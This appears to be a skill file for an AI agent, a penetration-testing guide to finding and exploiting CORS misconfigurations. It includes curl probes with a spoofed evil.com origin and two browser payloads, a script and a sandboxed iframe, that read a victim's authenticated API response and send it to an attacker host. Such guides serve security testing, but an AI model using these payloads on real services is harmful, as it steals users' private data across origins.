---
name: cors-misconfiguration
description: "CORS misconfiguration exploitation: reflected origins, null origin, and credential leakage across origins. Use this skill when an API sets CORS headers."
---

# CORS Misconfiguration

## Overview

CORS lets a page read cross-origin responses. A misconfiguration that reflects an arbitrary `Origin` plus `Access-Control-Allow-Credentials: true` lets an attacker read authenticated data.

## Detect

```bash
curl -s -I https://api.target/me -H "Origin: https://evil.com" | grep -i "access-control"
```

Vulnerable response:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

## Test matrix

```bash
for o in "https://evil.com" "null" "https://target.com.evil.com" "https://sub.target.com" "http://target.com"; do
  echo "== $o"
  curl -s -I https://api.target/me -H "Origin: $o" | grep -i "access-control-allow"
done
```

| Response | Meaning |
|---|---|
| echoes origin + credentials true | exploitable |
| `*` + credentials true | browsers reject; not exploitable |
| echoes `null` + credentials true | exploitable via sandboxed iframe |
| echoes origin without credentials | exploitable only for unauthenticated data |

## Exploit

```html
<script>
fetch("https://api.target/me", { credentials: "include" })
  .then(r => r.text())
  .then(d => fetch("https://attacker/collect?d=" + encodeURIComponent(d)));
</script>
```

`null` origin via a sandboxed iframe:

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.target/me',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://attacker/?d='+d)</script>"></iframe>
```

## Common misconfigurations

- Regex `.*target\.com.*` matches `eviltarget.com`.
- Reflecting `Origin` when it ends with the target domain, without checking the dot.
- Allowing all subdomains including a takeover-able one.
- `Access-Control-Allow-Origin: null` for local file usage.

## Pitfalls

- Without credentials, only public data leaks — low impact.
- Preflight (`OPTIONS`) configuration may differ from the actual request.
- Some frameworks add the header only on error responses.

## Verification

A cross-origin page must successfully read the authenticated response body.
